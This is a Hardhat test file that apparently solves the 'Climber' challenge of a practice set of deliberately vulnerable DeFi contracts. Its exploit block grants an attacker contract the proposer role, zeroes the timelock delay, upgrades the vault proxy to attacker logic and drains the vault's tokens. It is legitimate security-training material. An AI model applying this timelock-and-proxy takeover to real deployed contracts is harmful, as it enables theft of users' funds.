const { ethers,upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {

        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy( await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );


        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);

        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);

    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        console.log("11111111111");

        const attackVault = this.vault.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackTimeLock = this.timelock.connect(attacker);
        console.log("11111111111");

        const AttackContractFactory = await ethers.getContractFactory("AttackTimeLock", attacker);
        const attackContract = await AttackContractFactory.deploy(
            attackVault.address,
            attackTimeLock.address,
            attackToken.address,
            attacker.address
        );
        console.log("22222");

        const VaultForProxyFactory = await ethers.getContractFactory("AttackVault",attacker);
        const vaultForProxyContract = await VaultForProxyFactory.deploy();

        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
        //Helper function to create the ABI
        const createInterface = (signture, methodName, arguments) => {
            const ABI = signture;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName,arguments);

            return ABIData;
        }
        //Set attacker contract as proposer for timeLock
        const setupABIRole = ["function grantRole(bytes32 role,address account)"];
        const grantRoleData = createInterface(setupABIRole, "grantRole",[PROPOSER_ROLE,attackContract.address]);

        //Update delay to 0
        const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
        const updateDelayData = createInterface(updateDelayABI, "updateDelay",[0]);
        
        //Call to the vault to upgrade to attacker controlled contract vault logic
        const upgradeABI = ["function upgradeTo(address newImplementation)"];
        const upgradeData = createInterface(upgradeABI,"upgradeTo",[vaultForProxyContract.address]);

        //Call attacking contract to schedule these actions and sweep funds
        const exploitABI = ["function exploit()"];
        const exploitData = createInterface(exploitABI, "exploit",undefined);

        const toAddress = [attackTimeLock.address, attackTimeLock.address, attackVault.address,attackContract.address];
        const data =  [grantRoleData, updateDelayData,upgradeData, exploitData];

        await attackContract.setScheduleData(toAddress,data);

        //execute 4 calls
        await attackTimeLock.execute(toAddress, Array(data.length).fill(0),data, ethers.utils.hexZeroPad("0x00",32));
       
        await attackContract.withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
